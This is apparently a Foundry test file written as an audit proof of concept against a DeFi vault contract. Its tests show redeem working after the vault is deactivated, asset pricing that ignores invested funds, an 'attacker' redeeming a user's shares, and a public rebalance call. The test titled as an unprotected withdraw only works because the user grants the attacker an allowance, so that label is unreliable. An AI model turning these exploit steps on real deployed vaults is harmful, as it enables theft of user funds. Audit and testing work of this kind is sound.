// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Base_Test} from "../../Base.t.sol";
import {VaultShares, IERC20} from "../../../src/protocol/VaultShares.sol";
import {console2} from "forge-std/console2.sol";

/// @dev PoC: withdraw/redeem lack isActive (unlike deposit) and are callable by any address
/// with share allowance — Slither won't flag this; it's missing business-logic access control.
contract VaultSharesWithdrawTest is Base_Test {
    address internal guardian = makeAddr("guardian");
    address internal user = makeAddr("user");
    address internal attacker = makeAddr("attacker");

    uint256 internal constant DEPOSIT_AMOUNT = 10_000 ether;
    uint256 internal constant GUARDIAN_FUND = 100 ether;

    AllocationData internal allocationData = AllocationData(500, 250, 250);

    VaultShares internal wethVault;

    function setUp() public override {
        Base_Test.setUp();

        weth.mint(GUARDIAN_FUND, guardian);
        vm.startPrank(guardian);
        weth.approve(address(vaultGuardians), GUARDIAN_FUND);
        wethVault = VaultShares(vaultGuardians.becomeGuardian(allocationData));
        vm.stopPrank();
    }

    function testLargeDepositThenWithdrawWithoutIsActiveGuard() public {
        _userDepositsTenThousandEth();

        uint256 investedInAave = IERC20(wethVault.getAaveAToken()).balanceOf(address(wethVault));
        uint256 investedInUniswap = IERC20(wethVault.getUniswapLiquidtyToken()).balanceOf(address(wethVault));
        uint256 reportedTotalAssets = wethVault.totalAssets();

        console2.log("reported totalAssets (idle WETH only)", reportedTotalAssets);
        console2.log("aave position (aTokens)", investedInAave);
        console2.log("uniswap LP balance", investedInUniswap);

        // ERC4626 pricing ignores Aave/Uniswap — only idle WETH counts
        assertLt(reportedTotalAssets, DEPOSIT_AMOUNT);

        uint256 maxWithdrawWhileInvested = wethVault.maxWithdraw(user);
        console2.log("maxWithdraw while funds invested", maxWithdrawWhileInvested);
        // withdraw preview uses broken totalAssets — user cannot even request the full 10k
        assertLt(maxWithdrawWhileInvested, DEPOSIT_AMOUNT);

        _quitGuardian();
        assertFalse(wethVault.getIsActive());

        // deposit blocked, but withdraw/redeem are not — no isActive modifier
        weth.mint(1 ether, user);
        vm.startPrank(user);
        weth.approve(address(wethVault), 1 ether);
        vm.expectRevert(VaultShares.VaultShares__NotActive.selector);
        wethVault.deposit(1 ether, user);
        vm.stopPrank();

        uint256 wethBefore = weth.balanceOf(user);
        uint256 sharesToBurn = wethVault.maxRedeem(user);

        // divestThenInvest runs inside redeem: divest Aave/Uniswap first, then burn shares
        // no extra approve needed — msg.sender == owner
        vm.prank(user);
        wethVault.redeem(sharesToBurn, user, user);

        console2.log("user redeemed shares", sharesToBurn);
        console2.log("user received WETH", weth.balanceOf(user) - wethBefore);
        assertGt(weth.balanceOf(user), wethBefore);
        assertEq(wethVault.balanceOf(user), 0);
    }

    function testAttackerWithdrawsUserFundsViaUnprotectedWithdraw() public {
        _userDepositsTenThousandEth();

        uint256 attackerWethBefore = weth.balanceOf(attacker);
        uint256 sharesToBurn = wethVault.maxRedeem(user);

        // Attacker needs allowance on vault SHARES, not WETH
        vm.prank(user);
        wethVault.approve(attacker, type(uint256).max);

        vm.prank(attacker);
        wethVault.redeem(sharesToBurn, attacker, user);

        console2.log("attacker received WETH", weth.balanceOf(attacker) - attackerWethBefore);
        assertGt(weth.balanceOf(attacker), attackerWethBefore);
        assertEq(wethVault.balanceOf(user), 0);
    }

    function testAnyoneCanTriggerRebalanceOnTenThousandEthVault() public {
        _userDepositsTenThousandEth();

        vm.prank(attacker);
        wethVault.rebalanceFunds();
    }

    function _userDepositsTenThousandEth() internal {
        weth.mint(DEPOSIT_AMOUNT, user);
        vm.startPrank(user);
        weth.approve(address(wethVault), DEPOSIT_AMOUNT);
        wethVault.deposit(DEPOSIT_AMOUNT, user);
        vm.stopPrank();

        assertGt(wethVault.balanceOf(user), 0);
    }

    function _quitGuardian() internal {
        vm.startPrank(guardian);
        wethVault.approve(address(vaultGuardians), type(uint256).max);
        vaultGuardians.quitGuardian();
        vm.stopPrank();
    }
}
